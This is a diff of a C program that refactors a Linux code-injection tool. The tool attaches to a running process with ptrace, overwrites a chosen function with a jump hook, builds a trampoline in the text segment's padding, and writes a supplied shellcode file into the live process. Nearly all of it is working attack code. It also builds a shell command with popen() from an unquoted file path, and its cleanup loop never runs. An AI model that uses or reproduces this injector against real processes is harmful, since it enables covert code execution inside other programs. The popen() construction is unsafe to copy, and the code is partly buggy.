@@ -10,6 +10,8 @@
 #include <ctype.h>
 #include <stdarg.h>
 #include <sys/user.h>
+#include <stdint.h>
+#include <limits.h>
 
 #define PERM_READ   1
 #define PERM_WRITE  2
@@ -17,62 +19,94 @@
 #define PERM_SHARED 8
 #define PERM_PRIVATE 16
 
-struct mem_region {
-    char *mapped_file;
-    unsigned long base_address;
-    unsigned long end_address;
-    size_t region_sz;
+typedef uint64_t addr64_t;
+typedef uint32_t addr32_t;
+typedef addr32_t addr_rel32_t;
+
+struct mmap_region {
+    addr64_t base;
+    addr64_t end;
+    size_t size;
     int perms;
+    addr32_t offset;
+    // dev;
+    // inode;
+    char *mapped_file;
 };
 
 struct process_image {
-    struct mem_region *regions;
+    int pid;
+    struct mmap_region *regions;
     size_t regions_num;
 };
 
-static void *open_and_mmap(const char *pathname, int prot, int flags, size_t *len);
-static int parse_proc_maps(const char *line, struct mem_region *buf);
-static struct process_image *get_memory_regions(int pid);
-static unsigned long get_exec_section_padding_start(const char *file);
+#define bytearray(var) (uint8_t *)&(var)
+
+static int attach_to_process(int pid);
+static int detach_from_process(int pid);
+
+static void *fmmap(void *addr, size_t *length, int prot, int flags, const char *pathname, off_t offset);
+
+static void parse_proc_line(const char *line, struct mmap_region *buf);
+static void read_mem_regions(struct process_image *process);
+static struct process_image *create_proc_image(int pid);
+static void destroy_proc_image(struct process_image *image);
+
+static size_t pheader_size(addr32_t offset, const char *file);
+static void hexdump(uint8_t *bytes, size_t length, ...);
 
 size_t c_fmtlen(const char *format, ...);
 size_t c_vsprintf_alloc(char **buf, const char *format, va_list ap);
 size_t c_sprintf_alloc(char **buf, const char *format, ...);
 size_t c_vfmtlen(const char *format, va_list ap);
 
-static void *open_and_mmap(const char *pathname, int prot, int flags, size_t *len)
+static int attach_to_process(int pid)
+{
+    int err = ptrace(PTRACE_ATTACH, pid, NULL, NULL);
+
+    if (err >= 0)
+        waitpid(pid, NULL, 0);
+
+    return err;
+}
+
+static int detach_from_process(int pid)
+{
+    return (ptrace(PTRACE_DETACH, pid, 0, 0) < 0);
+}
+
+static void *fmmap(void *addr, size_t *length, int prot, int flags,
+                                const char *pathname, off_t offset)
 {
     int fd;
-    void *mmap_address = NULL;
     struct stat st;
+    void *mmap_addr = NULL;
 
     fd = open(pathname, O_RDWR);
     if (fd == -1)
         return NULL;
 
-    if (fstat(fd, &st) == -1)
-        return NULL;
-
-    mmap_address = mmap(0, st.st_size, prot, flags, fd, 0);
-    if (mmap_address == MAP_FAILED)
+    if (*length == 0) {
+        if (fstat(fd, &st) == -1)
             return NULL;
+        *length = st.st_size;
+    }
 
+    mmap_addr = mmap(addr, *length, prot, flags, fd, offset);
     close(fd);
 
-    *len = st.st_size;
-
-    return mmap_address;
+    return mmap_addr;
 }
-static int parse_proc_maps(const char *line, struct mem_region *buf)
+
+static void parse_proc_line(const char *line, struct mmap_region *buf)
 {
     char *end_addr = NULL;
     char *perms = NULL;
     const char *mapped_file = NULL;
 
-    buf->base_address = strtoul(line, &end_addr, 16);
-    buf->end_address = strtoul(end_addr+1, &perms, 16);
-
-    buf->region_sz = buf->end_address - buf->base_address;
+    buf->base = strtoul(line, &end_addr, 16);
+    buf->end = strtoul(end_addr+1, &perms, 16);
+    buf->size = buf->end - buf->base;
 
     buf->perms = 0;
     perms++;
@@ -97,95 +131,131 @@ static int parse_proc_maps(const char *line, struct mem_region *buf)
                 break;
         }
     }
+    buf->offset = strtoul(perms+1, NULL, 16);
 
     mapped_file = &line[strlen(line)-1];
-    if (isdigit(*mapped_file)) {  // anonymous mapping
+    if (isdigit(*mapped_file)) {  // last field is the inode so we have a anonymous map
         buf->mapped_file = NULL;
     } else {
-        while (*mapped_file != ' ')
+        while (*mapped_file != ' ' && *mapped_file != '[')
             mapped_file--;
-        buf->mapped_file = strndup(mapped_file+1, strlen(mapped_file+1) - 1);
+        if (*mapped_file == ' ')
+            mapped_file++;
+        buf->mapped_file = strndup(mapped_file, strlen(mapped_file)-1);
     }
-
-    return 0;
 }
 
-static struct process_image *get_memory_regions(int pid)
+
+static void read_mem_regions(struct process_image *process)
 {
-    struct process_image *process = malloc(sizeof(*process));
-    char filename[20];
+    char *filename = malloc(PATH_MAX);
     FILE *maps_file = NULL;
     char *line = NULL;
     size_t line_len = 0;
-    int lines = 0;
+    size_t lines = 0;
     void *temp_buf = NULL;
 
-    snprintf(filename, 20, "/proc/%d/maps", pid);
-
+    snprintf(filename, PATH_MAX, "/proc/%d/maps", process->pid);
     maps_file = fopen(filename, "r");
     if (!maps_file)
-        return NULL;
+        return;
 
     process->regions = NULL;
-
     while (getline(&line, &line_len, maps_file) != -1) {
         lines++;
         temp_buf = reallocarray(process->regions, lines, sizeof(*process->regions));
         if (!temp_buf)
             break;
-
         process->regions = temp_buf;
-        parse_proc_maps(line, process->regions+(lines-1));
+        parse_proc_line(line, process->regions+(lines-1));
     }
 
     process->regions_num = lines;
     free(line);
-
-    return process;
 }
 
-static unsigned long get_exec_section_padding_start(const char *file)
+static struct process_image *create_proc_image(int pid)
 {
+    struct process_image *proc_image = malloc(sizeof(*proc_image));
+
+    proc_image->pid = pid;
+    read_mem_regions(proc_image);
+
+    return proc_image;
+}
+
+static void destroy_proc_image(struct process_image *image)
+{
+    for (size_t i = 0; i > image->regions_num; i++)
+        free(image->regions[i].mapped_file);
+    free(image->regions);
+    free(image);
+}
+
+static size_t pheader_size(addr32_t offset, const char *file)
+{
+    size_t size = 0;
     char *command_str = NULL;
-    FILE *command = NULL;
-    unsigned long padding_start = 0;
+    FILE *pipe = NULL;
     char *line = NULL;
     size_t line_len = 0;
 
-    c_sprintf_alloc(&command_str, "readelf -e %s | grep LOAD -A1 | grep -e E | awk '{print $1}'", file);
+    // FIXME: port this function to use only C code without popen()
+    c_sprintf_alloc(&command_str, "readelf -l %s | grep 0x%016lx -A1 | grep -v LOAD | awk '{print $1}'", file, offset);
 
-    command = popen(command_str, "r");
+    pipe = popen(command_str, "r");
+    getline(&line, &line_len, pipe);
+    size = strtoul(line, NULL, 16);
 
-    getline(&line, &line_len, command);
-    padding_start = strtoul(line, NULL, 16);
-
-    pclose(command);
+    pclose(pipe);
     free(line);
     free(command_str);
 
-    return padding_start;
+    return size;
+}
+
+static void hexdump(uint8_t *bytes, size_t length, ...)
+{
+    addr32_t offset = 0;
+    int line_offset = 1;
+    //TODO: hexdump() needs to suports different kinds of hexdump format (think of xxd)
+    while(offset < length) {
+        printf("%02hhx", bytes[offset++]);
+
+        if (line_offset == 16) {
+            printf("\n");
+            line_offset = 1;
+            continue;
+        } else if (line_offset == 8) {
+            printf("  ");
+        } else {
+            printf(" ");
+        }
+        line_offset++;
+    }
+    if (line_offset != 16)
+        printf("\n");
 }
 
 int main(int argc, char *argv[])
 {
     const char *shellcode = NULL;
-    int shellcode_file_fd = 0;
-    struct stat st;
-    unsigned char *shellcode_mmaped = NULL;
-    size_t shellcode_mmaped_sz = 0;
-    struct user_regs_struct regs;
-    unsigned long address_to_hook, padding_start;
+    void *shellcode_mmaped = NULL;
+    addr_rel32_t address_to_hook;
     int target_pid;
-    void *object_file_mmap = NULL;
+    int shellcode_file_fd = 0;
     struct process_image *process = NULL;
-    struct mem_region *text_segment = NULL;
-    size_t mapping_len = 0;
+    struct mmap_region *text_segment = NULL;
+    addr_rel32_t padding_start;
+    addr_rel32_t hook_address;
+
+    size_t shellcode_sz = 0;
     unsigned long original_bytes;
     unsigned char add_rsp_8[4] = "\x48\x83\xc4\x08";    // add  rsp, 0x8
     unsigned char jmpn_function[5] = "\xe9\xfc\xff\xff\xff";  //	jmp near function_address
-    unsigned long hook_address;
     int hook_address_jmpto;
     int trampoline_jmp_address;
+    int err;
 
     unsigned char hook_asm[8] = "\xe9\x00\x00\x00\x00\x90\x90\x90";
 
@@ -198,32 +268,24 @@ int main(int argc, char *argv[])
     shellcode = argv[1];
     address_to_hook = strtoul(argv[2], NULL, 16);
     target_pid = atoi(argv[3]);
-    (void) address_to_hook;
 
     printf("attaching to target %d\n", target_pid);
 
-    if (ptrace(PTRACE_ATTACH, target_pid, 0, 0) < 0) {
-        perror("ptrace");
-        exit(1);
+    err = attach_to_process(target_pid);
+    if (err != 0) {
+        printf("failed to attach to target (%s)\n", strerror(err));
+        exit(EXIT_FAILURE);
     }
-
-    if (waitpid(target_pid, NULL, 0) < 0) {
-        perror("waitpid");
-        exit(1);
-    }
-
-    printf("getting process registers\n");
-    ptrace(PTRACE_GETREGS, target_pid, NULL, &regs);
 
     printf("preparing shellcode...\n");
-    object_file_mmap = open_and_mmap(shellcode, PROT_READ|PROT_WRITE, MAP_PRIVATE, &mapping_len);
-    if (!object_file_mmap) {
-        fprintf(stderr, "error opening \"%s\"\n", shellcode);
+    shellcode_mmaped = fmmap(0, &shellcode_sz, PROT_READ | PROT_WRITE, MAP_PRIVATE, shellcode, 0);
+    if (!shellcode_mmaped) {
+        fprintf(stderr, "error mapping \"%s\"\n", shellcode);
         exit(1);
     }
 
-    printf("checking for the text segment\n");
-    process = get_memory_regions(target_pid);
+    printf("gathering information about the process image\n");
+    process = create_proc_image(target_pid);
     if (!process) {
         fprintf(stderr, "failed to open /proc/%d/maps :(\n", target_pid);
         exit(1);
@@ -235,65 +297,52 @@ int main(int argc, char *argv[])
             break;
         }
     }
+    printf(".text segment at 0x%lx with size 0x%lx\n", text_segment->base, text_segment->size);
 
-    printf("found text segment at address 0x%lx with size 0x%lx\n", text_segment->base_address, text_segment->region_sz);
-    padding_start = get_exec_section_padding_start(text_segment->mapped_file) + text_segment->base_address;
-    printf("padding start at address 0x%lx\n", padding_start);
-    hook_address = (padding_start+17) - (address_to_hook+5);
+    padding_start = pheader_size(text_segment->offset, text_segment->mapped_file) + text_segment->base;
+    printf("padding start at address 0x%x\n", padding_start);
 
     original_bytes = ptrace(PTRACE_PEEKTEXT, target_pid, address_to_hook, NULL);
-    for (size_t i = 1; i < 1+sizeof(int); i++)
-        hook_asm[i] = (unsigned char)(hook_address >> (i-1)*8);
+    printf("original bytes = 0x%lx\n", original_bytes);
+    hexdump(bytearray(original_bytes), sizeof(original_bytes));
+
+    hook_address = (padding_start+17) - (address_to_hook+5);
+    printf("padding_start+17 = 0x%x (%d)\n", padding_start, padding_start);
+    printf("address_to_hook+5 = 0x%x (%d)\n", address_to_hook, address_to_hook);
+    printf("hook_address = 0x%x (%d)\n", hook_address, hook_address);
+
+    *(addr_rel32_t *)(hook_asm+1) = hook_address;
     hook_asm[7] = (unsigned char)(original_bytes >> 7 * 8);
+
     printf("writing hook to function...");
-    for (size_t i = 0; i < 8; i++)
-        printf(" 0x%02x", (unsigned char)hook_asm[i]);
-    printf("\n");
+    hexdump(hook_asm, sizeof(hook_asm));
     ptrace(PTRACE_POKETEXT, target_pid, address_to_hook, *(unsigned long *)hook_asm);
 
     trampoline_jmp_address = (address_to_hook+7) - (padding_start+17);
     *(int *)(jmpn_function+1) = trampoline_jmp_address;
-    printf("writing trampoline...");
+    printf("writing trampoline...\n");
 
     ptrace(PTRACE_POKETEXT, target_pid, padding_start, *(unsigned long *)add_rsp_8);
     ptrace(PTRACE_POKETEXT, target_pid, padding_start+4, original_bytes);
     ptrace(PTRACE_POKETEXT, target_pid, padding_start+4+sizeof(original_bytes), *(unsigned long *)jmpn_function);
 
     printf("writing shellcode...\n");
-    shellcode_file_fd = open(shellcode, O_RDWR);
-    fstat(shellcode_file_fd, &st);
-    shellcode_mmaped_sz = st.st_size;
-    shellcode_mmaped = mmap(0, shellcode_file_fd, PROT_READ | PROT_WRITE, MAP_PRIVATE, shellcode_file_fd, 0);
+    hook_address_jmpto = padding_start - (padding_start+4+sizeof(original_bytes)+5+shellcode_sz);
 
-    hook_address_jmpto = padding_start - (padding_start+4+sizeof(original_bytes)+5+shellcode_mmaped_sz);
+    *(int*)(shellcode_mmaped+(shellcode_sz-4)) = hook_address_jmpto;
+    hexdump(shellcode_mmaped, shellcode_sz);
 
-    *(int*)(shellcode_mmaped+(shellcode_mmaped_sz-4)) = hook_address_jmpto;
-    for (size_t i = 0; i < shellcode_mmaped_sz; i++) {
-        printf(" 0x%02x", (unsigned char )shellcode_mmaped[i]);
-        if (i > 0 && i % 8 == 0)
-            printf("\n");
-    }
-    printf("\n");
-
-    for (size_t i = 0; i < shellcode_mmaped_sz; i+=sizeof(unsigned long))
+    for (size_t i = 0; i < shellcode_sz; i+=sizeof(unsigned long))
         ptrace(PTRACE_POKETEXT, target_pid, padding_start+4+sizeof(original_bytes)+5+i, *(unsigned long *)(shellcode_mmaped+i));
 
+    destroy_proc_image(process);
     close(shellcode_file_fd);
-    munmap(shellcode_mmaped, shellcode_mmaped_sz);
-
-    for (size_t i = 0; i > process->regions_num; i++)
-        free(process->regions[i].mapped_file);
-    free(process->regions);
-    free(process);
+    munmap(shellcode_mmaped, shellcode_sz);
 
     printf("detaching from target\n");
-    if (ptrace(PTRACE_DETACH, target_pid, 0, 0) < 0) {
-        perror("ptrace");
-        exit(1);
-    }
+    detach_from_process(target_pid);
 
     printf("** It worked!! :)\n...or maybe not ¯\\_(ツ)_/¯\n");
-    munmap(object_file_mmap, mapping_len);
 }
 
 size_t c_fmtlen(const char *format, ...)
